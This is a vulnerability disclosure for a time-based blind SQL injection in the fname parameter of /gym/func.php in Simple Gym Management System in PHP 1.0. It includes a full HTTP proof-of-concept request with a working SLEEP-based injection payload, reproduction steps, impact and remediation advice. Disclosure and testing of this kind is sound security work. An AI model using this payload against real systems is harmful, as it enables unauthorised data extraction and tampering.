## Time-Based Blind SQL Injection in Simple Gym Management System in PHP
## Product

Simple Gym Management System in PHP

## Vendor

Code-Projects

## Vendor URL

https://code-projects.org/simple-gym-management-system-in-php-with-source-code/

## Affected Version

1.0

## Vulnerability Type

SQL Injection (Time-Based Blind)

CWE

CWE-89 – Improper Neutralization of Special Elements used in an SQL Command

## Severity

High

## Description

The Simple Gym Management System in PHP 1.0 is vulnerable to Time-Based Blind SQL Injection via the fname parameter handled by the /gym/func.php endpoint. The vulnerability occurs because the application fails to properly validate and sanitize user-supplied input before including it in SQL queries executed by the backend database.

During the patient/member registration process, the application accepts input parameters such as fname, lname, email, contact, and docapp. These parameters are processed by func.php. However, the application directly incorporates the fname parameter into a database query without the use of prepared statements or proper input filtering.

An attacker can exploit this weakness by injecting specially crafted SQL payloads into the fname parameter. By using database delay functions such as SLEEP(), the attacker can trigger measurable response delays from the server. This confirms that the injected SQL commands are executed by the backend database.

The vulnerability can be exploited in a time-based blind manner, meaning the attacker does not need direct database error messages to confirm successful injection. Instead, response timing differences allow attackers to infer database responses and gradually extract sensitive information from the system.

Successful exploitation of this vulnerability could allow attackers to enumerate database structures, retrieve sensitive data such as user records or administrative credentials, manipulate stored data, or perform further attacks depending on the privileges of the database account used by the application.

The root cause of this issue is the absence of input validation and the lack of parameterized queries when handling user-controlled input within SQL statements.

## Affected Endpoint
/gym/func.php
Vulnerable Parameter
fname
## Proof of Concept

The vulnerability can be triggered using the following HTTP request:
```plain
POST //gym/func.php HTTP/1.1
Host: localhost
Content-Length: 204
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="145", "Not:A-Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Accept-Language: en-US,en;q=0.9
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost//gym/admin-panel.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=d09ljmgtflh1l4dagc0opvshgr
Connection: keep-alive

fname=orwa(select(0)from(select(sleep(15)))v)%2f%2a'%2B(select(0)from(select(sleep(15)))v)%2B'%22%2B(select(0)from(select(sleep(15)))v)%2B%22%2a%2f&lname=1&email=1&contact=1&docapp=101&pat_submit=Register
```

## Steps to Reproduce

Install and run the Simple Gym Management System.

Navigate to the admin panel member registration functionality.

Intercept the registration request using a proxy tool such as Burp Suite.

Modify the fname parameter with a time-based SQL injection payload.

Send the request to the server.

Observe the server response time.

## Result

The server response is delayed by approximately 15 seconds, indicating that the injected SQL statement containing the SLEEP(15) function has been executed by the backend database.

This confirms the presence of a time-based blind SQL injection vulnerability.

## Impact

An attacker exploiting this vulnerability may be able to:

Extract sensitive database information

Enumerate database tables and columns

Retrieve administrator or user credentials

Modify or delete stored data

Potentially gain administrative access to the system

In severe cases, attackers could fully compromise the application database.

## Remediation

To mitigate this vulnerability, developers should implement the following security practices:

Use Parameterized Queries

Prepared statements prevent SQL injection attacks.

Example:

$stmt = $pdo->prepare("INSERT INTO patients (fname, lname, email, contact) VALUES (?, ?, ?, ?)");
$stmt->execute([$fname, $lname, $email, $contact]);
Input Validation

Validate and sanitize all user-supplied input before processing it.

Least Privilege Principle

Ensure the database account used by the application has minimal privileges.

Web Application Firewall

Deploy a Web Application Firewall (WAF) to detect and block SQL injection attempts.

## Vulnerability Classification

CWE

CWE-89 – SQL Injection

OWASP Top 10

A03:2021 – Injection

## Reference

https://code-projects.org/simple-gym-management-system-in-php-with-source-code/

https://cwe.mitre.org/data/definitions/89.html

https://owasp.org/www-community/attacks/SQL_Injection

<img width="1489" height="883" alt="Image" src="https://github.com/user-attachments/assets/596b61a5-f899-4222-8fa7-a3762c89e78d" />
